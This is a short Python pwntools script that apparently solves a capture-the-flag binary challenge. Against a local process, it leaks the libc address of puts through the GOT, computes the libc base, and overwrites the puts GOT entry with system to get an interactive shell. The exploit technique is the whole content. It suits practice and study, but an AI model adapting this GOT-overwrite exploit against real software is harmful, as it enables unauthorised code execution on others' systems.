#!/usr/bin/env python3

from pwn import *

exe = ELF("challenge_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    r = process([exe.path])
    if args.DEBUG:
        gdb.attach(r)

    return r


def main():
    r = conn()
    
    puts_got = exe.got.puts
    log.info(f"puts got @{puts_got:x}")

    r.sendlineafter("reason:", b"/bin/sh")
    r.sendlineafter("to inspect:", str(puts_got))
    
    log.info("[*] Leaking libc")
    
    r.recvuntil(": ")
    puts_libc_address = int(r.recvline(keepends=False))
    libc.address = puts_libc_address - libc.symbols["puts"]
    
    log.success(f"[*] Leaked libc, libc base @{libc.address:x}")

    r.sendlineafter("to modify:", str(puts_got))
    r.sendlineafter("to write:", str(libc.symbols["system"]))
    
    r.interactive()


if __name__ == "__main__":
    main()
